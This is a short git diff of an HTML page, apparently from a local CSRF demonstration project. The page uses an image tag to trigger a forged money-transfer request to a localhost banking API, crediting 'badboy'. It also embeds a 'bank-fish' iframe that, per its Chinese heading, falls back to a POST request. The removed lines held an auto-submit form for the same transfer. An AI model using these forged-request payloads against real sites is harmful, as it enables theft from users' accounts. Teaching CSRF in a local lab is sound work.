@@ -4,20 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>银行 csrf 页面</title>
-
 </head>
 <body>
-  <img src="http://localhost:3001/api/transerMoney?username=badboy&money=1000"/>
-  <h1>调用  $('form').submit(); 发起 post 请求</h1>
-  <!-- <iframe name="steal" display="none"> -->
-    <form action="http://localhost:3001/api/transerMoney"  method="post">
-      <input name="username" value="badboy"/>
-      <input name="money" value="100"/>
-    </form>
-  <!-- </iframe> -->
-  <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.js"></script>
-  <script>
-    //  $('form').submit();
-  </script>
+  <h2>通过图片 src 发起跨站请求</h2>
+  <img src="http://localhost:3001/api/transfer_money?username=badboy&money=1000"/>
+  <h2>如果 get 请求不通过,则 3s 后通过 iframe 会发起 post 请求</h2>
+  <iframe src="/bank-fish-iframe.html" frameborder="0"></iframe>
 </body>
 </html>
